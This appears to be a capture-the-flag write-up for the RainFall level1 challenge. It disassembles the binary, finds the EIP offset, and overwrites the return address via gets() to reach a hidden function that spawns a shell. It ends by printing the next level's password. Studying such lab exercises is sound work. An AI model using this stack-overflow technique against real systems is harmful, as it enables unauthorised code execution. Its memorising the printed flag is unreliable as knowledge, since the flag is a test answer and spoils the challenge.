doing an objdump gives us an overview of the functions present in the binary:

[...]

08048444 <run>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       a1 c0 97 04 08          mov    0x80497c0,%eax
 804844f:       89 c2                   mov    %eax,%edx
 8048451:       b8 70 85 04 08          mov    $0x8048570,%eax
 8048456:       89 54 24 0c             mov    %edx,0xc(%esp)
 804845a:       c7 44 24 08 13 00 00    movl   $0x13,0x8(%esp)
 8048461:       00
 8048462:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
 8048469:       00
 804846a:       89 04 24                mov    %eax,(%esp)
 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
 804847e:       c9                      leave
 804847f:       c3                      ret

08048480 <main>:
 8048480:       55                      push   %ebp
 8048481:       89 e5                   mov    %esp,%ebp
 8048483:       83 e4 f0                and    $0xfffffff0,%esp
 8048486:       83 ec 50                sub    $0x50,%esp
 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
 804848d:       89 04 24                mov    %eax,(%esp)
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
 8048495:       c9                      leave
 8048496:       c3                      ret
 8048497:       90                      nop
 8048498:       90                      nop
 8048499:       90                      nop
 804849a:       90                      nop
 804849b:       90                      nop
 804849c:       90                      nop
 804849d:       90                      nop
 804849e:       90                      nop
 804849f:       90                      nop

 [...]

# so we can see the main uses a gets, so we'll try a buffer overflow

# now let's find the size of the gets buffer and add 4 bytes at a time until we overwrite the EIP* with the little endian version of the run function,
# that seems to open a new shell
# *EIP is the instruction pointer, it points to the next instruction

level1@RainFall:~$ python -c 'print "A"*64' - | ./level1
level1@RainFall:~$ python -c 'print "A"*68' - | ./level1
level1@RainFall:~$ python -c 'print "A"*72' - | ./level1
level1@RainFall:~$ python -c 'print "A"*76' - | ./level1
Illegal instruction (core dumped)

# EIP starts on the 76th byte then

level1@RainFall:~$ python -c 'print "A"*80' - | ./level1
Segmentation fault (core dumped)

# confirmed for 76 

level1@RainFall:~$ python -c 'print "A"*76 + "\x44\x84\x04\x08"'  > /tmp/in

# use the - to keep stdin open and thus keep the shell open

level1@RainFall:~$ cat /tmp/in - | ./level1
Good... Wait what?
whoami
level2
cd /home/user
cd level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
exit

Segmentation fault (core dumped)